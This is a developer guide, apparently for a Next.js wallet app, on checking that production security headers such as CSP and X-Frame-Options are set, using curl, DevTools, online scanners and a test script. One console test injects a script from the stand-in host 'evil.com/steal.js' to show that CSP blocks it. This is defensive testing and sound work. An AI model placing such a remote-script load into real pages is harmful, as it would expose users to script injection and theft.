# How to Verify Production Security Headers

## Step 1: Build for Production

```bash
# Build the app (NODE_ENV will be 'production')
npm run build
```

**Expected Output:**
```
🔒 Security Headers Configuration:
   NODE_ENV: production
   CSP Enabled: YES ✅
   Production Mode: YES

Route (app)                              Size     First Load JS
┌ ○ /                                    ...      ...
```

If you see `CSP Enabled: YES ✅`, it means CSP will be active!

---

## Step 2: Test Production Build Locally

```bash
# Start production server
npm run start
```

Open browser: `http://localhost:3000`

---

## Step 3: Verify Headers in Browser

### Method 1: Chrome DevTools

1. Open DevTools (F12)
2. Go to **Network** tab
3. Refresh page (Ctrl+R)
4. Click on first request (usually the HTML document)
5. Scroll down to **Response Headers**

**You should see:**
```
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; ...
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), ...
```

### Method 2: curl Command

```bash
# Test locally
curl -I http://localhost:3000

# Test production (after deploy)
curl -I https://pepe-wallet-alpha.vercel.app
```

**Expected Output:**
```
HTTP/1.1 200 OK
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-eval' ...
x-frame-options: DENY
x-content-type-options: nosniff
...
```

### Method 3: Online Security Header Scanner

After deploying to production, test with:
- https://securityheaders.com
- https://observatory.mozilla.org

Enter your domain and it will give you a security grade!

---

## Step 4: Test CSP is Actually Blocking

### Test 1: Try to load external script

Open DevTools Console and run:
```javascript
// This should be BLOCKED by CSP in production
const script = document.createElement('script');
script.src = 'https://evil.com/steal.js';
document.head.appendChild(script);
```

**Expected in Console:**
```
Refused to load the script 'https://evil.com/steal.js' because it violates
the following Content Security Policy directive: "script-src 'self' 'unsafe-eval' 'unsafe-inline'".
```

### Test 2: Try inline onclick

```html
<!-- This should work (we allow unsafe-inline) -->
<button onclick="alert('test')">Click</button>
```

### Test 3: Try to embed in iframe

Try to embed your site in another site:
```html
<iframe src="https://pepe-wallet-alpha.vercel.app"></iframe>
```

**Expected:**
```
Refused to display 'https://pepe-wallet-alpha.vercel.app' in a frame because
it set 'X-Frame-Options' to 'deny'.
```

---

## Step 5: Compare Dev vs Production

### Development Mode (npm run dev)
```bash
npm run dev
curl -I http://localhost:3000 | grep -i "content-security"
# Should return NOTHING (no CSP in dev)
```

### Production Mode (npm run build && npm run start)
```bash
npm run build && npm run start
curl -I http://localhost:3000 | grep -i "content-security"
# Should return: content-security-policy: default-src 'self'; ...
```

---

## Troubleshooting

### Problem: CSP headers not showing

**Check 1: Verify build output**
```bash
npm run build
# Look for: "CSP Enabled: YES ✅"
```

**Check 2: Make sure using production server**
```bash
# Wrong (dev mode):
npm run dev

# Right (production mode):
npm run build
npm run start
```

**Check 3: Check package.json scripts**
```json
{
  "scripts": {
    "dev": "next dev",           // ← Development
    "build": "next build",       // ← Builds for production
    "start": "next start"        // ← Starts production server
  }
}
```

**Check 4: Verify NODE_ENV**
```bash
# During build
NODE_ENV=production npm run build

# During start
NODE_ENV=production npm run start
```

---

## Deployment Platforms

### Vercel
```bash
# Vercel automatically sets NODE_ENV=production
vercel deploy --prod
```

**Verify:**
- Deploy to Vercel
- Visit your site
- Open DevTools → Network → Check headers
- Should see CSP headers ✅

### Netlify
```toml
# netlify.toml
[build]
  command = "npm run build"
  publish = ".next"

[build.environment]
  NODE_ENV = "production"  # Explicitly set
```

### Docker
```dockerfile
# Dockerfile
FROM node:20-alpine

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .

# Build with production env
ENV NODE_ENV=production
RUN npm run build

EXPOSE 3000
CMD ["npm", "start"]
```

**Verify:**
```bash
docker build -t wallet-app .
docker run -p 3000:3000 wallet-app

# Check headers
curl -I http://localhost:3000 | grep -i security
```

---

## Security Headers Checklist

After deployment, verify these headers exist:

- [ ] `content-security-policy` - XSS protection
- [ ] `x-frame-options: DENY` - Clickjacking protection
- [ ] `x-content-type-options: nosniff` - MIME sniffing protection
- [ ] `referrer-policy` - Privacy protection
- [ ] `permissions-policy` - Feature policy

**Tool to check:** https://securityheaders.com

---

## Expected Security Grade

With current configuration, you should get:

**securityheaders.com:** Grade **B+** to **A-**

Why not A+?
- We use `'unsafe-eval'` and `'unsafe-inline'` (required for Next.js)
- To get A+, need stricter CSP with nonces (more complex setup)

Grade B+ is **excellent for a Next.js app**! 🎉

---

## Quick Verification Script

Create a test script:

```bash
#!/bin/bash
# test-security.sh

echo "🔍 Testing Security Headers..."
echo ""

echo "1️⃣ Building for production..."
npm run build | grep "CSP Enabled"

echo ""
echo "2️⃣ Starting production server..."
npm run start &
SERVER_PID=$!

# Wait for server to start
sleep 5

echo ""
echo "3️⃣ Checking headers..."
curl -sI http://localhost:3000 | grep -i "content-security\|x-frame\|x-content"

echo ""
echo "4️⃣ Stopping server..."
kill $SERVER_PID

echo ""
echo "✅ Verification complete!"
```

Run it:
```bash
chmod +x test-security.sh
./test-security.sh
```

---

## Visual Confirmation in Browser

Add this component to verify CSP in production:

```typescript
// src/components/debug/SecurityCheck.tsx
'use client';

export function SecurityCheck() {
  if (process.env.NODE_ENV === 'production') {
    return null; // Don't show in production
  }

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      padding: '8px',
      background: '#f44336',
      color: 'white',
      textAlign: 'center',
      fontSize: '12px',
      zIndex: 9999
    }}>
      ⚠️ DEVELOPMENT MODE - CSP Disabled
    </div>
  );
}
```

In production, this banner won't show, confirming you're in production mode!

---

## Summary

✅ **CSP is enabled** when:
- You run `npm run build` (builds with NODE_ENV=production)
- You run `npm run start` (serves production build)
- You deploy to Vercel/Netlify/etc (automatically sets production)

❌ **CSP is disabled** when:
- You run `npm run dev` (development mode)

🧪 **To verify:**
1. Build: `npm run build` → Look for "CSP Enabled: YES ✅"
2. Start: `npm run start`
3. Check: Open DevTools → Network → Response Headers
4. Should see: `content-security-policy: ...`

That's it! 🎉
